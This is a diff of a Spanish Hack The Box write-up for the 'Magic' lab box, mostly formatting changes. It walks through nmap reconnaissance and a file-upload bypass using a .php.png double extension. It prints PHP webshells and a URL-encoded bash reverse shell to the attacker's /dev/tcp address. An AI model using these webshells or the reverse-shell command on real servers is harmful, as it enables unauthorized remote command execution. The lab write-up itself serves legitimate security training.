@@ -21,6 +21,11 @@ tags:
   <img src="../assets/images/htb-writeup-magic/magic_logo.png">
 </p>
 
+## Introducción:
+
+
+Magic comienza con una vulnerabilidad clasica de carga insegura de archivos en PHP que nos permite colocar un webshell en el host de destino y luego explotamos una configuración incorrecta del servidor web para ejecutar el webshell (aunque el nombre del archivo no debe terminar con extensión .php). Una vez que aterrizamos un shell, escalamos a otro usuario.  
+
 ## Antes de iniciar:
 Como es mi primera maquina virtual (box) y soy nuevo con la plataforma de hackthebox, para poder jugar con las maquinas virtuales necesito una conexión con OpenVPN (esta aplicación viene preinstalada en Parrot OS). Esta aplicación permitirá ubicar nuestra host en la misma subred IP que las máquinas vulnerables (boxes), lo que le permitirá contactarlos y atacarlos.
 
@@ -28,34 +33,34 @@ Me ayudé con este video: https://www.youtube.com/watch?v=SmbpScohIFs . Este vid
 
 Inicializar la conexión en este comando:
 
-```
+```go
 sudo openvpn pack.ovpn
 ```
 
 En caso de tener el siguiente error al ejecutar el anterior comando: “Linux can't add IPv6 to interface tun1” es poder Ipv6 se encuentra dehabilitado. Se puede habilitar con este comando:
 
-```
+```go
 sudo sysctl net.ipv6.conf.all.disable_ipv6=0
 ```
 
 Nos aseguramos que se encuentre habilitado IPv6 con (debe imprimir 0): 
 
-```
+```go
 cat /proc/sys/net/ipv6/conf/all/disable_ipv6
 ```
-Fuente: https://forum.hackthebox.com/t/openvpn-troubles/3478/2 
+Fuente: [https://forum.hackthebox.com/t/openvpn-troubles/3478/2](https://forum.hackthebox.com/t/openvpn-troubles/3478/2) 
 
-Este video sirve para probar conexión con la maquina una vez hemos hecho lo anterior: https://www.youtube.com/watch?v=Ykaw6SSW994 
+Este video sirve para probar conexión con la maquina una vez hemos hecho lo anterior: [https://www.youtube.com/watch?v=Ykaw6SSW994](https://www.youtube.com/watch?v=Ykaw6SSW994) 
 
 Podemos comprobar nuestra IP remota con:
 
-```
+```go
 ip a s tun0
 ```
 
 Respuesta:
 
-```
+```go
 8: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
     link/none 
     inet 10.10.14.12/23 scope global tun0
@@ -69,35 +74,35 @@ Respuesta:
 
 ## Desarrollo de la practica:
 
-Basado en video de S4vitar on live: https://www.youtube.com/watch?v=ZJ72UuUlz10  
+Basado en video de S4vitar on live: [https://www.youtube.com/watch?v=ZJ72UuUlz10]( https://www.youtube.com/watch?v=ZJ72UuUlz10 )  
 
 Creo un directorio para la box actual:
 
-```
+```go
 mkdir magic
 ```
 
 y creamos los siguientes directorio dentro del él:
 
-```
+```go
 mkdir nmap content exploits
 ```
 
 Fase de reconocimiento:
 
-```
+```go
 cd nmap
 ```
 
 Comprobamos si tenemos conexión con la maquina con:
 
-```
+```go
 ping -c 1 10.10.10.185
 ```
 
 Obtenemos:
 
-```
+```go
 PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
 64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=183 ms
 
@@ -109,23 +114,22 @@ PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
 
 Adicionamente, con ping -R podemos ver las rutas IP por las que paso nuestro ping:
 
-```
+```go
 ping -c 1 10.10.10.185 -R
 ```
 
 Vamos a escanear puertos con nmap:
 
-```
+```go
 nmap -p- --open -T5 -v -n 10.10.10.185
 ```
 
 Con el anterior comando estamos diciendo:
-	- -p- → Escaneamos todo el rango de puertos (65.535 puertos).
-	- --open → Filtramos dejando solo los puertos que estan abiertos.
-	- -T5 → (Varia entre T0 hasta T5) Indica la rapidez con que queremos que se realice nuestro escaneo. En este caso es lo más rapido.
-
-	- -v → De verbose. A medida que encuentra puertos abiertos me los reporte por consola.
-	- -n → Para no aplicar resolución DNS y nuestro escaneo será más rápido.
+- -p- → Escaneamos todo el rango de puertos (65.535 puertos).
+- --open → Filtramos dejando solo los puertos que estan abiertos.
+- -T5 → (Varia entre T0 hasta T5) Indica la rapidez con que queremos que se realice nuestro escaneo. En este caso es lo más rapido
+- -v → De verbose. A medida que encuentra puertos abiertos me los reporte por consola.
+- -n → Para no aplicar resolución DNS y nuestro escaneo será más rápido.
 
 Resultado:
 
@@ -165,13 +169,11 @@ nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn -oG allports 10.10.10.185
 ```
 
 Con el anterior comando estamos diciendo:
-	- -sS → Que vaya los más rápido posible. 
-	- –min-rate 5000 → Vamos a emitir como minimo 5000 paquetes por segundo (Ya no es necesario -T5)
-
-	- -vvv → Para que nos arroje un poquito de más información de lo que encuentra nuestra busqueda.
-
-	- -Pn → Solo ejecuta el escaneo con host que estan activos, a diferencial del escaneo normal que realiza el procedicimiento de escaneo para un rango de IP aunque el/los host especificados no esten activos.
-	- -oG allports → Le decimos que la busqueda realizada la guarde en un archivo grepeable llamado “allports”. [Aqui]( https://www.asyforin.es/kali/herramienta-kali-3-nmap-miscelanea-y-salida-de-datos/ ) puedes encontrar más información sobre el formato grepeable.
+- -sS → Que vaya los más rápido posible. 
+- –min-rate 5000 → Vamos a emitir como minimo 5000 paquetes por segundo (Ya no es necesario -T5)
+- -vvv → Para que nos arroje un poquito de más información de lo que encuentra nuestra busqueda.
+- -Pn → Solo ejecuta el escaneo con host que estan activos, a diferencial del escaneo normal que realiza el procedicimiento de escaneo para un rango de IP aunque el/los host especificados no esten activos.
+- -oG allports → Le decimos que la busqueda realizada la guarde en un archivo grepeable llamado “allports”. [Aqui]( https://www.asyforin.es/kali/herramienta-kali-3-nmap-miscelanea-y-salida-de-datos/ ) puedes encontrar más información sobre el formato grepeable.
 
 
 ```
@@ -194,11 +196,9 @@ nmap -sCV -p22,80 10.10.10.185 -oN targered
 ```
 
 Con el anterior comando estamos diciendo:
-	- [-sCV](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-v+) → Versiones y ejecución de algunos scripts por defecto de nmap (algunos scripts son intrusivos). 
- 
-	- -p → Para especificar los comando a los cuales le queremos hacer lo anterior
-
-	- -oN targered → Que almacene en un archivo llamado “targered”en el formato de nmap (Salida normal) el resultado de este comando 
+- [-sCV](https://explainshell.com/explain?cmd=nmap+-sC+-sV+-v+) → Versiones y ejecución de algunos scripts por defecto de nmap (algunos scripts son intrusivos). 
+- -p → Para especificar los comando a los cuales le queremos hacer lo anterior
+- -oN targered → Que almacene en un archivo llamado “targered”en el formato de nmap (Salida normal) el resultado de este comando 
 
 Resultado:
 
@@ -384,8 +384,10 @@ Ahora subimos una imagen de prueba para ver como es el comportamiento de la apli
 </p>
 Podemos consultar la imagen con esta url: [http://10.10.10.185/images/uploads/imagen-de-prueba.png](http://10.10.10.185/) 
 Por las rutas de las imagenes que ya estan podemos decir que las imagenes son almacenadas en 2 rutas:  
+
 - [http://10.10.10.185/images/uploads](http://10.10.10.185/images/uploads)
 - [http://10.10.10.185/images/fulls](http://10.10.10.185/images/fulls)
+
 Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad está reportada en [OWASP](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) ), el cual nos permita ejecutar comandos a nivel de sistema (dentro del servidor) a través de la URL. El archivo “prueba.php” es el siguiente:
 
 ```
@@ -393,6 +395,7 @@ Intentaremos subir a nuestra página un archivo de tipo php (esta vulnerabilidad
   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 ```
+
 El anterior comando nos permitira por medio de etiquetas preformateadas (Texto HTML Preformateado) controlar el valor de la variable “cmd” para poder ejecutar comandos en el servidor que corre el aplicativo web. En caso de funcionar esto, se podrian ejecutar comandos como este ejemplo: http://10.10.10.185/images/uploads/prueba.php?cmd=whoami 
 
 Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imagenes:
@@ -401,6 +404,7 @@ Pero obtenemos que no se admite el formato php, solo 3 tipos de formatos de imag
   <img src="../assets/images/htb-writeup-magic/No-se-admite-el-formato.png">
 </p>
 Tampoco si intentamos subir la imagen con una extensión diferente ([prueba.jpg](prueba.jpg)) pero con el mismo contenido:
+
 ```
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/tampoco-se-admite-con-otra-extension.png">
@@ -425,24 +429,32 @@ Se complico un poco subir el archivo modificando los magic numbers manualmente, 
 ```
 <?php system($_GET['cmd']); ?>
 ```
+
 Quedaría algo así:
+
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/php-en-archivo-extension-php-png.png">
 </p>
+
 Lo subimos y obtenemos una respuesta exitosa:
+
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/subida-exitosa-php-png.png">
 </p>
+
 Probamos la ruta [http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png?cmd=whoami](http://10.10.10.185/images/uploads/pruebaReverseShell2.php.png?cmd=whoami), en la cual ya estamos asignando el valor “whoami” a la variable cmd que se ejecutará en el servidor. Obtenemos “www-data”:
+
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/respuesta-exitosa-subida-php-png.png">
 </p>
+
 De esta forma comprobamos la ejecución de comandos. Ahora intentamos hacer una reverse shell. Para esto primero localmente debemos ponernos en escucha por el puerto 443 usando la herramienta [netcat] (https://blog.desdelinux.net/usando-netcat-algunos-comandos-practicos/?utm_source=twitterfeed&utm_medium=twitter):
 
 ```
 > sudo nc -nlvp 443
 listening on [any] 443 ...
 ```
+
 Y en la url establecemos la conexión desde el servidor [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'). Pero no anterior no punciona porque la barra de url no reconoce el signo **&** , y en vez de eso debemos poner su correpondiente en códificación url que es ** & → %26 **. Quedaría así: [http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261'](http://10.10.10.185/images/uploads/pruebaReverseShell.php.png?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.12/443 0>%261')
 <p align="center">
   <img src="../assets/images/htb-writeup-magic/reverse-shell-completada.png">
